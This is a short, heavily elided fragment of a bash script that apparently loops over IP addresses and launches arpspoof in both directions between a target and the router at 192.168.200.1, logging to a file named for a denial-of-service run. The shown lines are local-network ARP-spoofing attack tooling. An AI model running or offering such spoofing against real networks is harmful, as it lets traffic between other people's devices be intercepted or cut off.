...
do 
    ...
    if [ "$Random_IP" = "192.168.200.1" ]; then
        printf "$i) router\'s IP\n" 2>&1 | tee -a arpspoof_output/dos_log.txt
        ...
        printf "\n\n*** $start_current_time Executing : $Arpspoof$sep$Random_IP$sep$router and $Arpspoof$sep$router$sep$Random_IP\n\n"

        printf $(eval $Arpspoof$sep$Random_IP$sep$router) & scriptARP1=$!
        printf $(eval $Arpspoof$sep$router$sep$Random_IP) & scriptARP2=$!
